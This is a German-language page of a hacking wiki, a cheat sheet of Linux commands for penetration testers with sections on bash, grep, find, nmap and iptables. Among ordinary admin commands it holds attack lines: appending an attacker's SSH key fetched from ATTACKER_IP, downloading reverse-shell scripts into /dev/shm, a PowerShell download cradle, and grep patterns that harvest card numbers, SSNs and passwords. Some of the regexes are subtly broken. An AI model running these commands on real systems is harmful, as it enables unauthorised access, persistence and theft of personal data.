# Nützliche Linux-Befehle

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Null bis zum Helden mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Gemeinsame Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash für Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Grep is a powerful command-line tool used for searching text patterns in files. It is an essential tool for Linux users and can be used in various scenarios. Here are some useful grep commands:

### Basic Grep

The basic grep command syntax is as follows:

```bash
grep [options] pattern [file...]
```

- `pattern` is the text pattern you want to search for.
- `file` is the file(s) you want to search in. If no file is specified, grep will search in standard input.

Here are some examples:

- Search for a specific word in a file:

```bash
grep "word" file.txt
```

- Search for a pattern in multiple files:

```bash
grep "pattern" file1.txt file2.txt file3.txt
```

### Case-Insensitive Search

By default, grep performs a case-sensitive search. To perform a case-insensitive search, use the `-i` option:

```bash
grep -i "pattern" file.txt
```

### Recursive Search

To search for a pattern in all files within a directory and its subdirectories, use the `-r` option:

```bash
grep -r "pattern" directory/
```

### Invert Match

To search for lines that do not match a pattern, use the `-v` option:

```bash
grep -v "pattern" file.txt
```

### Count Matches

To count the number of matches for a pattern, use the `-c` option:

```bash
grep -c "pattern" file.txt
```

### Display Line Numbers

To display line numbers along with the matching lines, use the `-n` option:

```bash
grep -n "pattern" file.txt
```

### Regular Expressions

Grep supports regular expressions for more advanced pattern matching. Here are some examples:

- Search for lines starting with a specific word:

```bash
grep "^word" file.txt
```

- Search for lines ending with a specific word:

```bash
grep "word$" file.txt
```

- Search for lines containing one of multiple patterns:

```bash
grep "pattern1\|pattern2" file.txt
```

These are just a few examples of what you can do with grep. It is a versatile tool that can be used in various ways to search and manipulate text files.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Find

### Description

The `find` command is used to search for files and directories in a directory hierarchy based on different criteria such as name, size, type, and more. It is a powerful tool that can be used for various purposes, including system administration, file management, and security auditing.

### Syntax

The basic syntax of the `find` command is as follows:

```
find [path] [expression]
```

- `path`: Specifies the directory or directories to search in. If no path is provided, the current directory is used.
- `expression`: Specifies the search criteria. This can include options, tests, and actions.

### Examples

1. Search for a file by name:

   ```
   find /path/to/directory -name "filename"
   ```

   This command will search for a file with the specified name in the given directory and its subdirectories.

2. Search for files by extension:

   ```
   find /path/to/directory -name "*.txt"
   ```

   This command will search for files with the `.txt` extension in the specified directory and its subdirectories.

3. Search for files by size:

   ```
   find /path/to/directory -size +10M
   ```

   This command will search for files larger than 10 megabytes in the specified directory and its subdirectories.

4. Search for directories:

   ```
   find /path/to/directory -type d
   ```

   This command will search for directories in the specified directory and its subdirectories.

5. Search for files modified within a specific time range:

   ```
   find /path/to/directory -type f -newermt "2021-01-01" ! -newermt "2022-01-01"
   ```

   This command will search for files modified between January 1, 2021, and December 31, 2021, in the specified directory and its subdirectories.

### Additional Resources

- [Linux man page for find](https://man7.org/linux/man-pages/man1/find.1.html)
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap-Suchhilfe

Nmap ist ein leistungsstolles Tool zur Netzwerkscannung und -erkennung. Es bietet eine Vielzahl von Optionen und Funktionen, um Informationen über Netzwerke und Hosts zu sammeln. Hier sind einige nützliche Befehle und Optionen, die Ihnen bei der Verwendung von Nmap helfen können:

- **Grundlegende Scan-Typen:**
  - `nmap <Ziel-IP>`: Führt einen Standard-Scan auf das angegebene Ziel durch.
  - `nmap -sS <Ziel-IP>`: Führt einen SYN-Scan durch, um offene Ports zu erkennen.
  - `nmap -sU <Ziel-IP>`: Führt einen UDP-Scan durch, um offene UDP-Ports zu erkennen.
  - `nmap -sV <Ziel-IP>`: Führt einen Versions-Scan durch, um Informationen über Dienste und deren Versionen zu erhalten.

- **Erweiterte Scan-Optionen:**
  - `nmap -p <Port> <Ziel-IP>`: Führt einen Scan auf einem bestimmten Port durch.
  - `nmap -p- <Ziel-IP>`: Führt einen Scan auf allen Ports durch.
  - `nmap -A <Ziel-IP>`: Führt einen aggressiven Scan durch, um detaillierte Informationen zu erhalten.
  - `nmap -O <Ziel-IP>`: Führt einen Betriebssystemerkennungs-Scan durch, um das Betriebssystem des Ziels zu identifizieren.

- **Ausgabeoptionen:**
  - `nmap -oN <Dateiname> <Ziel-IP>`: Speichert die Ergebnisse in einer normalen Textdatei.
  - `nmap -oX <Dateiname> <Ziel-IP>`: Speichert die Ergebnisse in einer XML-Datei.
  - `nmap -oG <Dateiname> <Ziel-IP>`: Speichert die Ergebnisse in einer Grep-fähigen Textdatei.

- **Weitere Optionen:**
  - `nmap -T<0-5> <Ziel-IP>`: Legt die Scan-Geschwindigkeit fest (0 = Paranoid, 5 = Insane).
  - `nmap -v <Ziel-IP>`: Gibt detaillierte Ausgaben während des Scans aus.
  - `nmap -h`: Zeigt die Hilfe und eine Liste aller verfügbaren Optionen an.

Diese Befehle und Optionen sind nur ein Auszug aus den vielen Funktionen, die Nmap bietet. Es ist wichtig, die Dokumentation zu lesen und mit den verschiedenen Optionen vertraut zu werden, um das Beste aus diesem leistungsstarken Tool herauszuholen.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash ist eine beliebte Shell für Linux-Systeme. Hier sind einige nützliche Befehle, die Ihnen bei der Verwaltung und Überwachung Ihres Systems helfen können:

### Dateisystem

- `ls`: Zeigt den Inhalt des aktuellen Verzeichnisses an.
- `cd`: Wechselt das Verzeichnis.
- `pwd`: Zeigt den Pfad des aktuellen Verzeichnisses an.
- `mkdir`: Erstellt ein neues Verzeichnis.
- `rm`: Löscht eine Datei oder ein Verzeichnis.
- `cp`: Kopiert eine Datei oder ein Verzeichnis.
- `mv`: Verschiebt eine Datei oder ein Verzeichnis.
- `find`: Sucht nach Dateien oder Verzeichnissen.
- `grep`: Durchsucht Dateien nach einem bestimmten Muster.
- `chmod`: Ändert die Berechtigungen einer Datei oder eines Verzeichnisses.
- `chown`: Ändert den Besitzer einer Datei oder eines Verzeichnisses.
- `chgrp`: Ändert die Gruppe einer Datei oder eines Verzeichnisses.

### Prozessverwaltung

- `ps`: Zeigt laufende Prozesse an.
- `top`: Zeigt die laufenden Prozesse in Echtzeit an.
- `kill`: Beendet einen Prozess.
- `killall`: Beendet alle Prozesse mit einem bestimmten Namen.
- `bg`: Setzt einen Prozess in den Hintergrund.
- `fg`: Holt einen Prozess in den Vordergrund.

### Netzwerk

- `ifconfig`: Zeigt Netzwerkschnittstelleninformationen an.
- `ping`: Sendet ICMP Echo-Anforderungen an eine IP-Adresse.
- `netstat`: Zeigt Netzwerkverbindungen, Routingtabellen und Schnittstellenstatistiken an.
- `ssh`: Stellt eine sichere Verbindung zu einem Remote-Server her.
- `scp`: Kopiert Dateien zwischen lokalem und Remote-Server.
- `wget`: Lädt Dateien von einer URL herunter.

### Systeminformationen

- `uname`: Zeigt Informationen über den Kernel an.
- `whoami`: Zeigt den aktuellen Benutzernamen an.
- `hostname`: Zeigt den Hostnamen des Systems an.
- `uptime`: Zeigt die Systemlaufzeit an.
- `df`: Zeigt Informationen über die Dateisystemnutzung an.
- `free`: Zeigt Informationen über den Arbeitsspeicher an.
- `lscpu`: Zeigt Informationen über die CPU an.

Diese Befehle sind nur ein Auszug aus den vielen verfügbaren Bash-Befehlen. Sie können weitere Befehle und deren Optionen in der Bash-Dokumentation finden.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables ist ein leistungsstarkes Werkzeug zur Verwaltung der Firewall in Linux. Es ermöglicht die Filterung von Netzwerkverkehr basierend auf verschiedenen Kriterien wie IP-Adresse, Portnummer und Protokoll. Iptables kann verwendet werden, um den eingehenden und ausgehenden Datenverkehr zu kontrollieren und somit die Sicherheit des Systems zu erhöhen.

### Grundlegende Befehle

- `iptables -L`: Zeigt die aktuelle Konfiguration der Firewall an.
- `iptables -F`: Löscht alle Regeln aus der Firewall.
- `iptables -A <chain> -p <protocol> --dport <port> -j <action>`: Fügt eine Regel hinzu, um den Datenverkehr auf einen bestimmten Port basierend auf dem angegebenen Protokoll zu steuern. `<chain>` kann INPUT, OUTPUT oder FORWARD sein, `<protocol>` kann TCP, UDP oder ICMP sein, `<port>` ist die Portnummer und `<action>` kann ACCEPT, DROP oder REJECT sein.
- `iptables -D <chain> <rule_number>`: Löscht eine bestimmte Regel aus der Firewall, basierend auf der angegebenen Regelnummer.

### Beispiel

Angenommen, wir möchten den eingehenden Datenverkehr auf Port 22 (SSH) blockieren, können wir folgenden Befehl verwenden:

```bash
iptables -A INPUT -p tcp --dport 22 -j DROP
```

Dieser Befehl fügt eine Regel zur INPUT-Kette hinzu, um den eingehenden TCP-Datenverkehr auf Port 22 zu blockieren.

Um die aktuelle Konfiguration der Firewall anzuzeigen, können wir den Befehl `iptables -L` verwenden.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
